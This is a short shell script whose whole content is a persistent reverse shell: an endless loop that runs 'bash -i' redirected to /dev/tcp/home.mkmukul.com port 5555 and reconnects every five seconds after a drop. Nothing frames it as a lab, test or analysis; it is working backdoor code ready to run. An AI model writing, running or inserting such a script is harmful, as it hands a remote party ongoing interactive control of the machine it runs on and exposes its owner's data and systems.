
#! /bin/sh
declare -i i=0
while true
do
    i=$((i+1))
    echo "$i Connection start..."
    bash -i >& /dev/tcp/home.mkmukul.com/5555 0>&1
    echo "$i Connection end"
    sleep 5
done